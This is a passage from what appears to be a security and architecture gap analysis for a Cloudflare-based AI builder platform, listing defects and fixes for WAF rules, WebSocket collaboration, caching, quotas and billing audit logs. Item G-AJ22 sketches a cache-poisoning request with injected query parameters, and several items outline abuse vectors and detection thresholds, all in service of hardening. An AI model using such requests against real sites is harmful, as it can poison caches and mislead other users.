No Custom WAF Rules Beyond Cloudflare Default Ruleset — Platform-Specific Attack Patterns Go Unblocked

The Gap

Cloudflare's built-in WAF provides OWASP CRS protection but does not know about Naelao-specific attack patterns: abuse of the free credit endpoint, bulk space creation, enumeration of spaceIds via the management API, suspicious patterns in agent instruction payloads, or bulk knowledge base upload (data exfiltration preparation). The default ruleset blocks generic web attacks but misses the platform's unique abuse surface. A sophisticated attacker targeting Naelao specifically can bypass generic rules.

Required Fix

Define custom CF WAF rules (CF Ruleset Engine) for Naelao-specific patterns: (1) rate limit POST /auth/register to 5 req/min per IP (per G-AG34 fraud prevention), (2) rate limit GET /spaces (space enumeration) to 100 req/min per API key, (3) block requests where the Content-Type is application/json but the body is >10MB (bulk injection prevention), (4) challenge (Turnstile CAPTCHA) any IP that triggers >10 WAF rule matches in 1 minute, (5) block TOR exit nodes and known malicious IP lists on the builder management plane (allow on product-facing endpoints for privacy). Monitor WAF rule triggers in Analytics Engine for tuning.

G-AI49 MEDIUM §Developer Experience — Structured Error Messages for Builder Debugging

Agent Failures Return Generic Error Toasts With No Request ID, Stack Trace, or Structured Debug Context

The Gap

When an agent run fails, the builder sees a generic "Something went wrong" error toast in the dashboard with no correlation ID, no indication of which tool call failed, no stack trace, and no link to the relevant logs. The error is a 500 response from an anonymous Worker with no structured payload. Debugging requires manually searching Analytics Engine across all 22 Workers for errors in the approximate time window, with no correlation ID (G-AG21) to follow. Mean time to resolution for production incidents is measured in hours, not minutes.

Required Fix

Implement a structured error response format for all 500/4xx responses: { "error": { "code": "AGENT_TOOL_CALL_FAILED", "message": "human text", "trace_id": "cf-trace-{id}", "request_id": "{UUID}", "timestamp": ISO, "component": "naelao-mcp-hub", "context": { "tool_name", "agent_run_id", "space_id" } } }. The trace_id links to the W3C Trace Context (G-AG21). Display the error in the dashboard with a "Copy error details" button and a "View in logs" link that pre-fills the log search with the request_id. For known error codes, provide a link to the troubleshooting guide.

G-AI50 LOW §Developer Community — Builder Community Platform

No Builder Community Forum or Discord — Builders Work in Isolation With No Peer Support or Template Sharing

The Gap

There is no community infrastructure for the builder ecosystem: no Discord server, no community forum (Discourse, Circle), no "Show and Tell" gallery of builder products, no developer office hours, and no peer support channel. Builders who encounter novel use cases, configuration challenges, or want to share templates have no official venue. Without community, the platform has no organic word-of-mouth growth engine, no user-generated content that improves discoverability, and high early churn from isolated builders who feel unsupported.

Required Fix

Establish a builder community: (1) launch a Discord server with channels: #showcase (products), #templates (share manifests), #troubleshooting, #feature-requests, #announcements, (2) integrate a Naelao bot in Discord that can query the knowledge base and docs (eating the own dog food), (3) run monthly builder showcases (video calls where builders demo their products), (4) publish a weekly newsletter with featured builders, template of the week, and platform updates, (5) create a Hall of Fame (builders who have shipped successful products) to incentivise quality. Embed the Discord join link prominently in the builder dashboard.

Appendix AJ — Real-time Collaboration, Federation, Edge Caching, Capacity Planning, Observability & Data Portability Gaps

50 gaps · G-AJ01 – G-AJ50 · six cross-cutting subsystem bands

G-AJ01 CRITICAL Real-time Collaboration — DO WebSocket Broadcast

Slow-Client WebSocket Starvation Blocks Entire SpaceDO

The Gap

ws.send() inside a Durable Object is synchronous. When broadcasting to all connected WebSocket clients, a single slow or back-pressured client blocks the entire DO thread until its send buffer drains. Under concurrent editing with N builders or end-users connected to the same SpaceDO, one stalled TCP connection freezes all real-time updates, triggering cascading timeouts and visible UI freezes for everyone else.

Required Fix

Replace synchronous broadcast loops with non-blocking writes. Wrap each ws.send() in a try/catch with a per-client send deadline (e.g., close clients whose send buffer has been pending > 5 seconds). Use WebSocket per-client state tags to track slow clients and evict them gracefully. Consider segmenting high-frequency streams (cursor updates) onto separate sub-DO channels so they cannot stall structural state broadcasts.

G-AJ02 HIGH Real-time Collaboration — Builder Dashboard

No Live Cursor / Multiplayer Presence Protocol for Co-Editing

The Gap

The spec has a basic presence table (last_seen timestamps) in ProjectDO, but there is no protocol for real-time cursor position sharing between concurrent builders editing the same Space. When two builders have the same agent config editor open, neither sees the other's cursor, selection highlights, or field-level focus. This leads to silent overwrites: builder A saves a field just as builder B is typing into it.

Required Fix

Implement a lightweight cursor-broadcast channel over the existing WebSocket connection. Each edit session claims a session-scoped color; every 100 ms, the client sends a cursor message {type:'cursor', field_id, offset, color}. The DO relays it to all other sessions without persisting it. On reconnect, broadcast a full presence snapshot. This requires no CRDT — it is purely ephemeral display data that prevents the 'silent overwrite' UX failure.

G-AJ03 HIGH Real-time Collaboration — SpaceDO Editor

Optimistic UI Updates Lack Server Reconciliation on Conflict

The Gap

The builder dashboard applies edits optimistically (instant local update, then network round-trip). When two builders are simultaneously editing and both hit the server within the same DO lock window, one succeeds and the other receives a 409. The client shows the 409 error but does NOT reconcile the UI — the builder's local state diverges from server state until a full page reload. Lost in-progress text input is a common user complaint in collaborative editors.

Required Fix

On 409 conflict response, fetch the current server version of the field, perform a 3-way merge (base, local-edit, server-edit), and present the conflict to the user as an inline diff with Accept/Discard options. Store the last-known server version tag per field in client state so the merge base is always available without an extra round-trip.

G-AJ04 HIGH Real-time Collaboration — Session Management

No Ephemeral Collaboration Session Invite (View-Only / Guest Editor)

The Gap

A builder cannot invite an external collaborator (designer, client, technical reviewer) to a live editing session with scoped access. The only access model is account membership. There is no short-lived invite link that grants time-limited view-only or edit access to a specific section of a Space without creating a full platform account.

Required Fix

Implement ephemeral session tokens: POST /spaces/{id}/sessions returns a signed JWT (expires in 24h) containing {space_id, role: 'viewer'|'commenter'|'editor', scope: ['agents'|'knowledge'|'channels']}. The recipient opens a branded collaboration URL; the router validates the JWT and connects them to the correct SpaceDO WebSocket with the declared permission mask applied. Sessions auto-expire; no account creation required.

G-AJ05 MEDIUM Real-time Collaboration — Space Configuration

No Per-Field Change History or Diff Viewer for Space Config

The Gap

Space configuration snapshots are stored at the whole-Space level. A builder who wants to know 'what changed in this agent's system prompt last Tuesday?' must manually compare two full Space exports. There is no per-field or per-resource change history, diff viewer, or ability to revert a single field without rolling back the entire Space.

Required Fix

Extend the Space version store to record field-level change events: {ts, actor_id, resource_type, resource_id, field, old_value, new_value}. Store these in SpaceDO SQLite in a versioning table (capped at last 1000 events per resource). Expose a diff API: GET /spaces/{id}/agents/{agentId}/history returns a paginated list of changes per field with before/after values. Add a revert action that replays a targeted field write.

G-AJ06 HIGH Real-time Collaboration — Space Configuration

Space Configuration Has No Git-Like Version Control with Branching

The Gap

Builders managing production Spaces have no safe way to test configuration changes before applying them to live users. The only workflow is 'edit → save → live immediately.' There is no concept of a staging branch, a draft config, or a preview deployment that end-users are NOT routed to.

Required Fix

Implement named configuration environments: 'production' (live), 'staging' (preview URL), 'draft' (in-editor only). Each environment stores its own snapshot of agent definitions, workflows, and channel configs in SpaceDO SQLite under an environment key. Builders promote staging → production via a POST /spaces/{id}/promote which atomically swaps the config pointer. Traffic routing uses the environment tag in the subdomain or request header. This eliminates the 'one typo breaks all users' failure mode.

G-AJ07 HIGH Real-time Collaboration — Locking / Concurrency

Silent Lock Collision — Builders Receive No Notification on Edit Conflict

The Gap

When builder A holds a pessimistic lock on an agent and builder B tries to edit the same agent, builder B receives a terse 409 error. There is no notification to builder A that someone is waiting, no visual indicator in builder A's session that another builder is blocked, and no timeout countdown UI. Builder B's work is silently discarded if they do not notice the error banner.

Required Fix

Add a lock-contention broadcast: when builder B is blocked by builder A's lock, the DO sends a notification to builder A's WebSocket: 'Builder B is waiting to edit this agent. Finish editing?' Include a countdown timer (lock expires in Xs). Builder B's UI shows 'Waiting for builder A to finish…' with an estimated wait. Automatically release locks on WebSocket disconnect to prevent dead-lock from tab closure.

G-AJ08 HIGH Real-time Collaboration — WebSocket Transport

WebSocket Reconnect Has No Missed-Event Replay

The Gap

When a builder's WebSocket drops (network hiccup, mobile switching from WiFi to LTE, laptop wakes from sleep), the client reconnects and receives no catch-up of events that occurred during the disconnect window. The UI is silently stale until a user action triggers a refresh. For long-running agent tasks (multi-minute workflow executions), the builder misses all status updates and believes the task is still pending.

Required Fix

Implement a server-side event log per WebSocket session: the DO buffers the last 500 events (or last 60 seconds) in a circular FIFO in SQLite. On reconnect, the client sends {type:'reconnect', last_seq: N}; the DO replays all events with seq > N. Events older than the buffer are replaced by a 'snapshot' message containing current state. Assign monotonic sequence numbers to all DO→client messages. This pattern eliminates stale UI on reconnect without requiring a full page reload.

G-AJ09 MEDIUM Interoperability — Agent SDK

No LangChain / LlamaIndex Adapter Export for Naelao Agents

The Gap

Developers integrating Naelao agents into existing Python/TypeScript AI pipelines (LangChain, LlamaIndex, Semantic Kernel) must write custom HTTP wrappers. There is no first-party adapter that exports a Naelao agent as a LangChain Runnable, a LlamaIndex BaseTool, or a Semantic Kernel plugin. This raises the integration cost and discourages ecosystem adoption.

Required Fix

Publish an official @naelao/langchain-adapter package: it wraps the Naelao /agents/{id}/invoke REST endpoint as a LangChain BaseLanguageModel and as a Tool[]. Similarly, publish a Python package naelao-llamaindex-adapter exporting a BaseTool. Maintain compatibility with LangChain LCEL (Runnable interface). These adapters expand addressable developer mindshare without changing the platform's core architecture.

G-AJ10 HIGH Interoperability — Identity & Access

Naelao Cannot Act as an OAuth2 Provider for External Applications

The Gap

Naelao authenticates users via WorkOS (consumer of OAuth), but there is no mechanism for a builder's product to issue OAuth2 tokens to third-party apps that want to act on behalf of an end-user. A builder building a SaaS that integrates with external tools (Notion, Google Drive, Slack) cannot implement 'Connect with Naelao' buttons that let users authorize those tools to access their Space data.

Required Fix

Implement a lightweight OAuth2 Authorization Server within AuthWorker: support the Authorization Code flow with PKCE. Builders register client_id/client_secret for their Space (stored encrypted in SpaceDO). The authorization endpoint renders a consent screen listing requested scopes (read:messages, write:knowledge, etc.). Issued access tokens are Space-scoped JWTs signed with the platform's ECDSA key, verifiable by any external service via the JWKS endpoint. Refresh tokens rotate on use and store in SpaceDO SQLite.

G-AJ11 MEDIUM Interoperability — API Surface

REST-Only API — No GraphQL for Complex Client Queries

The Gap

The platform exposes REST endpoints only. Clients (especially the dashboard SPA) must fan-out multiple sequential REST calls to build complex views: agents list + each agent's tools + knowledge base stats + billing summary = 4–6 round-trips. Mobile clients on high-latency networks experience visible loading waterfalls. There is no query batching, field selection, or subscription mechanism for live updates beyond WebSocket.

Required Fix

Add a GraphQL endpoint at /graphql served by a dedicated naelao-graphql Worker. Use a schema-first approach: define the complete Space, Agent, KnowledgeBase, Billing query/mutation schema. Resolve each field via Service Binding RPC to the owning worker — no new business logic, just an aggregation layer. Support @defer for deferred fields and subscriptions for live agent status. Expose a persisted query store (hashed queries) to eliminate schema introspection over the wire in production.

G-AJ12 MEDIUM Interoperability — Automation

No Zapier / Make.com Trigger and Action Definitions

The Gap

Builders cannot connect their Naelao products to the 6,000+ apps available in Zapier or Make.com without writing custom Webhooks. There are no official Naelao Zapier triggers (e.g., 'New conversation started', 'Agent task completed', 'New member joined Space') or actions ('Send message to Space', 'Create knowledge base document', 'Trigger workflow'). This blocks non-technical builders from automating between Naelao and their existing tool stack.

Required Fix

Build a naelao-zapier package and register it on the Zapier Developer Platform. Define triggers with polling fallback (GET /spaces/{id}/events?after={timestamp}) and instant triggers via webhooks. Define actions wrapping POST endpoints. Make.com integration follows the same pattern with a custom app module. Maintain these as thin HTTP client wrappers — no additional server infrastructure needed; all business logic stays in existing workers.

G-AJ13 HIGH Interoperability — API Documentation

No OpenAPI Schema Auto-Generation for Builder-Exposed Worker Endpoints

The Gap

Each Space exposes HTTP endpoints (agent invoke, knowledge search, channel webhooks) but there is no machine-readable OpenAPI 3.1 schema generated for them. Builders cannot use tools like Swagger UI, Postman, or code generators to explore or integrate with their Space's API. Enterprise buyers evaluating Naelao require OpenAPI specs as part of procurement.

Required Fix

Add a GET /spaces/{id}/openapi.json endpoint implemented by SpaceWorker. It reads the Space's configured agents, tools, and channel webhooks from DO, and renders a complete OpenAPI 3.1 document (paths, request/response schemas, auth requirements). Publish a static platform-level schema at /openapi.json for the core Naelao management API (create/list/update Spaces, members, billing). Auto-generate TypeScript SDK types from the schema using openapi-typescript in the CI pipeline.

G-AJ14 MEDIUM Interoperability — Space Types

Space Type JSON Schema Not Exported for External Tooling

The Gap

Space Type definitions (the blueprint a builder configures a product from) are stored in SpaceTypeDO as internal JSON. There is no export of the Space Type as a JSON Schema or TypeScript type definition. This prevents external tooling (Postman environment generators, config validators, IaC tools) from understanding the shape of a Space Type's configurable parameters without reverse-engineering from the UI.

Required Fix

Expose GET /space-types/{id}/schema returning a JSON Schema Draft 2020-12 document describing all configurable parameters (type, enum values, constraints, descriptions). Also expose a TypeScript definition file at /space-types/{id}/types.d.ts generated from the same schema. Update the Space Type authoring UI to derive its configuration form directly from this schema, ensuring schema and UI are always in sync. Include the schema in the Space Type's marketplace listing for discovery.

G-AJ15 LOW Interoperability — Migration

No Import Path from Competing Builder Platforms

The Gap

Builders who have existing products on Bubble, Webflow, Glide, Softr, or Adalo cannot migrate their data, schema, or workflows to Naelao. There is no import wizard, data migration tool, or even documentation for a manual migration path. This raises switching costs and slows adoption from builders who already have live products elsewhere.

Required Fix

Build a naelao-import Worker exposing /import/bubble, /import/webflow, /import/airtable endpoints. Each importer accepts an exported data package from the source platform and translates it to a Naelao Space config bundle (agents.json, knowledge_base.json, schema.json). Data rows are bulk-loaded into the new Space's SQLite tables via streaming COPY. Non-translatable features are logged as import warnings. Phase 1 covers schema + data; Phase 2 covers workflow logic mapping.

G-AJ16 LOW Interoperability — Discovery

No ActivityPub / Fediverse Federation for Builder Product Discovery

The Gap

Builder products are discoverable only within the Naelao marketplace. There is no federation protocol enabling a public Space's activity (new products launched, community discussions) to appear in Mastodon, Lemmy, or other Fediverse instances. This limits organic discovery to users already on Naelao.

Required Fix

Implement an optional ActivityPub actor per public Space: GET /spaces/{id}/ap/actor returns an ActivityPub Person/Service JSON-LD document with inbox/outbox. Public agent outputs and product updates are published as Create/Note activities to the outbox. Followers on Mastodon receive these in their home feeds. This is an opt-in feature (builders enable 'Fediverse presence' toggle). It requires a naelao-activitypub Worker handling HTTP Signature verification for incoming messages.

G-AJ17 HIGH Edge Caching — KV Invalidation

KV Cache Invalidation Pagination Gap — Keys >1000 Never Purged

The Gap

The invalidateToolCache() and similar bulk KV invalidation functions call kv.list({prefix}) which returns at most 1000 keys per call. The code does NOT loop with a cursor to exhaust all pages. When a Space has more than 1000 cached tool schema entries (common for large MCP marketplaces), only the first 1000 are deleted. The remainder continue serving stale data indefinitely, causing agents to call tools with outdated schemas.

Required Fix

Add cursor-based pagination to all KV list-and-delete operations: while (true) { const result = await kv.list({prefix, cursor}); await Promise.all(result.keys.map(k => kv.delete(k.name))); if (!result.list_complete) cursor = result.cursor; else break; } Throttle parallel deletes to batches of 25 to avoid KV rate limits (1200 writes/s per account). Add a counter metric to track how many keys were invalidated per call for observability.

G-AJ18 HIGH Edge Caching — MCP Tool Registry

MCP Tool Schema Cache Has No Version-Based Invalidation

The Gap

MCP tool schemas are cached in KV with a 1-hour TTL. When a tool author publishes a schema update (new parameter, changed type, new required field), agents continue calling the tool with the stale schema for up to 60 minutes. During this window, tool calls constructed from the stale schema fail at the MCP server with validation errors, silently degrading agent performance.

Required Fix

Add a schema_version field (content hash or monotonic integer) to all MCP tool manifests. The KV cache key includes the version: tool:{tool_id}:{schema_version}. When the ToolRegistryDO detects a version change, it proactively deletes the old version key and optionally pre-warms the new one. Agents pin their schema version per session and re-fetch only when a version change notification arrives via the tool registry's change feed. Add an emergency flush endpoint: POST /tool-registry/flush-cache?tool_id=X.

G-AJ19 HIGH Edge Caching — Content Delivery

No Surrogate Key / Cache Tag Purging for Builder Content Updates

The Gap

When a builder updates an agent's description, a knowledge base article, or a product page, the CF Cache API entries for those pages are not purged. The old cached responses are served until their max-age expires. With default 60-second TTLs this is manageable, but for marketplace listing pages (cached for longer for SEO) the staleness window grows to minutes or hours.

Required Fix

Add Surrogate-Key (Fastly) or Cache-Tag (CF Enterprise) headers to all cacheable responses. Each Space page includes Cache-Tag: space-{id} product-{id} agent-{agentId}. When content changes, the worker calls the CF Cache Purge API (Zone.purge_tags) for the affected tags. Use a purge queue (CF Queue) to batch-purge tags at up to 30 tags per API call. For non-Enterprise accounts, use surrogate-based conditional invalidation via If-None-Match ETags derived from the Space's content version hash.

G-AJ20 MEDIUM Edge Caching — Deployment

No Cache Warming Strategy — Cold-Start Thundering Herd After Deployment

The Gap

After each deployment of the marketplace or product pages, the CF edge cache is cold. The first N concurrent requests for each popular page all miss cache and hit origin Workers simultaneously, causing a thundering herd spike on the DO tier. For high-traffic products, this can cause CPU quota exhaustion in the seconds immediately following a deploy.

Required Fix

Implement a post-deploy cache warmer: a CI/CD pipeline step fires after deployment and sequentially fetches the top-100 marketplace pages and top-50 builder product pages (ranked by last-week traffic from Analytics Engine). These requests include a Cache-Warmup: 1 header that Workers use to log the warm without billing the builder. Additionally, implement stale-while-revalidate at the Worker level so that expiring cache entries are refreshed in the background before they become cold.

G-AJ21 MEDIUM Edge Caching — Static Assets

Static Assets Have No Content-Hashed Fingerprinting

The Gap

JavaScript bundles, CSS files, and web fonts served by the platform use predictable filenames (main.js, styles.css) with short-lived Cache-Control headers. Every deploy invalidates all client-side caches even when individual files have not changed. Returning users re-download identical unchanged files, wasting bandwidth and increasing page load times unnecessarily.

Required Fix

Add content-addressable asset filenames to the build pipeline: main.[contenthash8].js, styles.[contenthash8].css. These get Cache-Control: public, max-age=31536000, immutable (1-year CDN + browser cache). The HTML entrypoint references the hashed names and gets Cache-Control: no-cache (validated on each navigation). This pattern is standard in Vite/Webpack and requires no runtime change — only build config. Add a deploy-time diff step that identifies unchanged hashed files and skips uploading them to R2.

G-AJ22 HIGH Edge Caching — Security

Cache Poisoning via Query String Manipulation

The Gap

Workers use caches.default.put(request, response) where the cache key defaults to the full request URL including query string. An attacker can poison the CF edge cache for a product page by sending GET /products/foo?utm_source=<injected-variation>&__cf_chl_tk=... with a crafted response body (if they can influence the response) or with a vary on an arbitrary parameter. Cache keys are not normalized, so ?a=1&b=2 and ?b=2&a=1 store separate entries, causing cache fragmentation.

Required Fix

Define explicit cache key normalization in Workers: strip all tracking parameters (utm_*, fbclid, gclid, __cf_*) before constructing the cache key. Use a canonical URL function that sorts remaining query params alphabetically. Apply this canonicalization to both put() and match() calls. Add a Cache-Control: no-store override for any response that sets a user-specific cookie or includes Authorization-gated content, to prevent accidental caching of personalized responses at the edge.

G-AJ23 LOW Edge Caching — Personalization

No Edge-Side Partial Caching for Personalized Pages

The Gap

Product pages contain a mix of fully cacheable content (hero text, agent descriptions, pricing) and user-personalized content (member status, usage stats, active conversations). The current approach caches nothing once a user is authenticated, causing origin Workers to handle every page load for logged-in users. At millions of active users, this significantly increases DO request volume.

Required Fix

Implement a split-response pattern: cache the 'shell' of each page (layout, static content) separately from the personalized fragment. The shell is served from CF edge cache with a 5-minute TTL; the personalized fragment is fetched via a separate /me API call from the client after the shell loads. This technique (sometimes called 'fragment caching' or 'edge-side includes') requires no CF Enterprise features — it is a client-side composition pattern supported by the existing SPA architecture.

G-AJ24 CRITICAL Capacity Planning — Resource Quotas

Per-Space CPU and DO Alarm Budget Is Completely Undefined

The Gap

The platform defines plan-level limits (maxSubSpaces, maxMembers, maxAgents) but never defines per-Space CPU time budgets, DO alarm cycle budgets, or Workers invocation quotas. A single free-tier Space can spawn unlimited Durable Objects (one per sub-space), run unlimited alarm cycles, and consume unbounded CPU — with no enforcement and no cost attribution to the responsible builder. At millions of builder products, this is an existential abuse vector.

Required Fix

Define a ResourceBudget record per Space in SpaceDO SQLite: {cpu_ms_per_day, do_alarm_cycles_per_hour, worker_invocations_per_min, r2_read_ops_per_day, vectorize_queries_per_day}. Set per-tier defaults in the platform config. Instrument every DO alarm handler and every SpaceWorker request handler to decrement the appropriate budget counter. When a budget is exhausted, return 429 with Retry-After. Reset budgets via a nightly DO alarm. Alert the builder via notification when they reach 80% of any budget.

G-AJ25 HIGH Capacity Planning — Quota Enforcement

Builder-Tier Quota Ledger Is Fragmented Across KV, SQL, and Pre-Reservation

The Gap

Quota enforcement is split across three incompatible systems: rate limits in KV (with ~60s eventual consistency — wrong for quotas), concurrent run counts in SpaceDO SQLite, and AI token budgets in a pre-reservation store. These three systems are not reconciled. A builder can simultaneously be within their KV rate limit, within their SQL concurrent-run count, and within their token reservation — while exceeding all three from an actual resource-consumption standpoint because the systems never compare totals.

Required Fix

Consolidate all quota state into a single QuotaDO per Space (a lightweight Durable Object). All quota dimensions (rate, concurrency, daily tokens, storage) are checked via a single RPC call: QuotaDO.checkAndDecrement(dimension, amount) → {allowed: bool, remaining: int}. QuotaDO uses CF DO's transactional storage to avoid race conditions. KV and scattered SQL quota checks are removed. This single-source-of-truth eliminates the fragmentation and enables a unified quota dashboard per Space.

G-AJ26 HIGH Capacity Planning — Abuse Prevention

No Account-Level Throttle on Space Creation Rate

The Gap

A builder (or a script using a stolen API key) can call POST /builder/products in a loop and create thousands of Spaces within seconds. Each Space provisions a SpaceDO, registers in the global registry, and consumes platform quota. There is no per-account Space creation rate limit (e.g., maximum 1 Space per 30 seconds for free, 5 per minute for pro). This enables rapid resource exhaustion and pollutes the marketplace with spam products.

Required Fix

Add a SpaceCreationRateLimiter using CF Durable Objects (one per account_id). Each call to create a Space atomically checks and decrements a token-bucket counter with per-tier refill rates (free: 2/hour, pro: 20/hour, enterprise: unlimited). Return 429 with Retry-After on exhaustion. Additionally, require email verification before the first Space can be created and add a machine-learning-based bot score check (CF Bot Management score) on the creation endpoint to block automated mass creation.

G-AJ27 HIGH Capacity Planning — Sandbox Abuse

No CPU Anomaly Detection or Kill Switch for Cryptomining in Sandboxes

The Gap

Builder-submitted container images run in Cloudflare Containers (Sandboxes) and have access to significant CPU time. There is no runtime CPU usage monitoring, no anomaly detection for sustained high-CPU patterns (characteristic of cryptomining), and no platform-level kill switch to terminate a container that violates acceptable use. A malicious builder can use sandbox slots for cryptocurrency mining, wasting platform resources and potentially impacting other tenants.

Required Fix

Instrument the SandboxManagerDO with CPU sample polling: every 5 seconds, read the container's CPU usage via the CF Containers stats endpoint. Maintain a rolling 60-second CPU average per container. If the average exceeds 90% CPU for more than 30 consecutive seconds with no inbound/outbound network I/O (signature of offline mining), trigger an automatic container termination and flag the builder account for review. Add a manual kill endpoint: POST /admin/containers/{id}/terminate for emergency response. Log all termination events to the immutable audit log.

G-AJ28 HIGH Capacity Planning — Storage Abuse

No Per-Upload Size Limit or Free-Tier R2 Storage Cap

The Gap

R2 uploads from Sandboxes and the knowledge base importer have no documented per-upload size limit (spec mentions 100MB for reads, but upload size is uncapped). A free-tier builder can upload multi-gigabyte files to R2 in a single request, incurring storage costs that the platform absorbs. There is also no cumulative R2 storage cap per builder tier — a builder could fill terabytes of R2 on a free plan.

Required Fix

Enforce upload limits at two levels: (1) Per-request: UploadWorker rejects requests where Content-Length exceeds the tier limit (free: 50MB, pro: 500MB, enterprise: 5GB). For multipart uploads, validate each part and abort the upload if cumulative size exceeds the limit. (2) Per-account: A nightly CF Cron Trigger aggregates R2 storage per builder account using Analytics Engine data and blocks new uploads when the cumulative limit is exceeded (free: 5GB, pro: 100GB, enterprise: custom). Notify builders at 80% capacity.

G-AJ29 HIGH Capacity Planning — Workflow Concurrency

CF Workflow Concurrency Quota Per Builder Is Unbounded

The Gap

The spec defines per-tier concurrent agent run limits (free: 1, pro: 10, team: 25) enforced in SpaceDO. However, CF Workflow instances are launched directly from worker code and are not counted against this limit. A builder can invoke POST /workflows/{name} in parallel and spin up thousands of CF Workflow instances. Each instance consumes CF compute quota and can have up to 1000 steps — creating a denial-of-service vector against the platform's CF account.

Required Fix

Track active CF Workflow instance counts in WorkflowRegistryDO per (space_id, builder_id). Before launching a new Workflow instance, check that the current count is below the tier limit. Use WorkflowRegistryDO's SQLite table: INSERT and check rowcount, reject with 429 if at limit. On workflow completion/failure callbacks, DELETE the count entry. Set an absolute platform-wide hard cap (e.g., 5000 concurrent instances) enforced via a global CounterDO. Expose current count in the builder's quota dashboard.

G-AJ30 MEDIUM Capacity Planning — Scraping Defense

No IP/ASN-Level Rate Limiting for Unauthenticated Marketplace Scraping

The Gap

The marketplace pages are publicly accessible for SEO, but there are no per-IP or per-ASN rate limits on unauthenticated reads. A competitor or data broker can scrape the entire Naelao marketplace (all public product listings, prices, agent descriptions) without authentication. The x402 payment-for-AI-crawlers mechanism only covers AI crawlers that declare themselves; traditional scrapers bypass it entirely.

Required Fix

Add CF Rate Limiting Rules on the marketplace router: unauthenticated requests from the same IP are limited to 60 requests/minute with a 5-minute block on violation. For ASN-level abuse (scraper botnets), integrate CF's Managed Challenge action: Turnstile CAPTCHA for ASNs that exceed 10k requests/hour. Serve truncated responses (no pricing, no contact info) to requests that match CF Bot Management score < 30 (bot). Add a robots.txt that disallows aggressive indexers and honor CF's standard bot disallow lists.

G-AJ31 MEDIUM Capacity Planning — DDoS Mitigation

No Per-Space Custom DDoS Mitigation Rules Beyond Global CF WAF

The Gap

The spec mentions 'CF Network: WAF + DDoS + Bot Mgmt' as a single line. There are no per-Space rate limit rules, no custom WAF rules specific to each builder's product endpoints, and no mechanism for a builder to configure DDoS thresholds for their own product. A targeted DDoS against a specific builder's product uses the full platform's global CF capacity without any Space-specific mitigation, potentially affecting other tenants sharing the same CF account.

Required Fix

Expose a per-Space WAF rules API: builders configure up to 10 custom rate limit rules (e.g., /api/ask limited to 30 req/min per IP). These rules are pushed to CF's Rulesets API via the provisioning worker at Space creation and when updated. Add platform-owned baseline rules for common attack patterns (POST flood, header injection). For enterprise builders, expose a DDoS mitigation webhook: when CF detects an attack targeting a Space's domain, notify the builder's ops contact and auto-enable Under Attack mode for that subdomain only.

G-AJ32 HIGH Capacity Planning — Billing Integrity

No Signed Metered Usage Logs for Chargeback Fraud Evidence

The Gap

Builders are billed for metered usage (AI tokens, worker invocations, R2 ops). When a builder disputes a charge ('I never used that many tokens'), the platform has no cryptographically signed, tamper-evident audit trail of usage events to present as evidence. Analytics Engine records are not signed and can theoretically be queried/modified. Stripe disputes require evidence within 7 days; without signed logs the platform loses all chargebacks by default.

Required Fix

After each billable usage event, append a signed event to an immutable log: {ts, space_id, dimension, amount, nonce} signed with the platform's Ed25519 private key. Store signed events in R2 under an append-only path (billing-audit/{space_id}/{YYYY-MM-DD}/{ulid}.json) with Object Lock (WORM) if the R2 plan supports it.
